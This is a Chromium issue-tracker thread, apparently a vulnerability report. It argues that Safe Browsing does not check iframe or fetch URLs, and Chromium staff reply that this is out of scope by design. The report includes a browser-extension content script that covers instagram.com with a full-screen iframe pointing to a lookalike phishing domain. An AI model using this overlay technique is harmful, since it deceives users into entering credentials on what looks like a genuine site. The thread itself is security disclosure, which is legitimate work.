@@ -1,0 +1,126 @@
+Issue ID: 436988688
+
+Author: ch...@google.com
+Chrome used to check iframe and fetch URLs, but stopped doing that in 2024 because of the threat landscape changes. If the hosting site loads phishing URLs as subresources, Safe Browsing will block the hosting site instead. See <a href="https://www.google.com/url?q=https://blog.chromium.org/2024/02/optimizing-safe-browsing-checks-in.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1Daazp6rKJDF5xcU6uIxm9" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://blog.chromium.org/2024/02/optimizing-safe-browsing-checks-in.html" data-b-redirected-href="https://www.google.com/url?q=https://blog.chromium.org/2024/02/optimizing-safe-browsing-checks-in.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1Daazp6rKJDF5xcU6uIxm9">https://blog.chromium.org/2024/02/optimizing-safe-browsing-checks-in.html</a> for details (the &quot;Sub-resource checks&quot; section).
+
+Author: ch...@google.com
+Google safe browsing is not working in all fetch request, we can fetch via extension bypassing CORS
+
+Author: ch...@google.com
+google_domain
+
+Author: # Steps to reproduce the problem
+Have an extension that can replace inject iframe in the page of the destined website. For my case i used instagram.com
+ The iframe src url i used is a phishing site i have attached the content script code for your reference.
+
+"window.addEventListener("load", () => {
+  // Clear the original page
+  //document.documentElement.innerHTML = "";
+  //document.head.innerHTML = "";
+  //document.body.innerHTML = "";
+  document.body.style.margin = "0";
+  document.body.style.padding = "0";
+  document.body.style.overflow = "hidden";
+
+  // Create fullscreen iframe with your site
+  const iframe = document.createElement("iframe");
+  iframe.src = "https://insatgram.vercel.app/";
+  iframe.sandbox = "allow-scripts allow-same-origin";
+  Object.assign(iframe.style, {
+    position: "fixed",
+    top: "0",
+    left: "0",
+    width: "100vw",
+    height: "100vh",
+    border: "none",
+    zIndex: "2147483647",
+  });
+"
+
+When the script is loaded the working phishing site gets loaded for the instagram.com in the url context of the browser.
+
+# Problem Description
+The legitimate page with the security badge can be bypassed with one malicious extension replacing the iframe.
+
+As the mentioned url in the iframe is a known phishing site but the safebrowsing validation is not done for the fetch api and iframe src ,.. places.
+
+This causes the phishing page to be loaded in a actual legitimate site .
+
+# Additional Comments
+i have attached the extension code to reproduce the issue 
+
+# Summary
+Google safe browsing is not working in all fetch request, we can fetch via extension bypassing CORS
+
+# Custom Questions
+#### Reporter credit: 
+Mohammed Yasar (b.mhdyasar@gmail.com)
+
+# Additional Data
+Category: Security \
+Chrome Channel: Stable \
+Regression: N/A \
+WkdRM016bGhOVFE1T0dVMk1tUTVZVFEwWVdWaE9UWTJabUl3WmpJMU5tRT0=
+
+Author: b....@gmail.com
+Google safe browsing is not working in all fetch request, we can fetch via extension bypassing CORS
+
+Author: b....@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: b....@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: cb...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: cb...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+Services (Use Subcomponents), Services (Use Subcomponents)>Safebrowsing
+
+Author: pe...@google.com
+google_domain
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: va...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: va...@chromium.org
+public_non_google
+
+Author: xi...@chromium.org
+Thanks for the report. Abusive extensions are outside the scope of Safe Browsing&#39;s phishing protection. Once they are installed, they have many other ways to conduct phishing (e.g. modify the content directly, stealing cookies). Please report abusive extensions through the &quot;Flag concern&quot; feature on the Chrome Web Store instead.
+
+Author: xi...@chromium.org
+public_non_google
+
+Author: xi...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: b....@gmail.com
+The Issue is not only scoped with extension. The extension is used for injecting iframe src page .<br><br>The Google safebrowsing doesnot prevent the iframe src &quot;urls&quot; from phishing site. I have hosted a html on my site and have given the iframe src url with a valid - online phishing site . NOTE : This site is already added in the safe browsing db. <br><br>When the site is entered in the url bar the safebrowsing prevents it from loading. But the same if loaded from the iframe src., its getting loaded with out any issues. This also includes the fetch api used on sites.<br><br>I have attached the POC video which doesnot involve extension but a site using iframe src to load the phishing site. <br><br>
+
+Author: b....@gmail.com
+TkRNMk9UZzROamc0TFRZNE1qWXhPVFV5TFMweE5EZ3pPRGd6TXpReg==
+
+Author: xi...@chromium.org
+Chrome used to check iframe and fetch URLs, but stopped doing that in 2024 because of the threat landscape changes. If the hosting site loads phishing URLs as subresources, Safe Browsing will block the hosting site instead. See <a href="https://www.google.com/url?q=https://blog.chromium.org/2024/02/optimizing-safe-browsing-checks-in.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1Daazp6rKJDF5xcU6uIxm9" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://blog.chromium.org/2024/02/optimizing-safe-browsing-checks-in.html" data-b-redirected-href="https://www.google.com/url?q=https://blog.chromium.org/2024/02/optimizing-safe-browsing-checks-in.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1Daazp6rKJDF5xcU6uIxm9">https://blog.chromium.org/2024/02/optimizing-safe-browsing-checks-in.html</a> for details (the &quot;Sub-resource checks&quot; section).
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
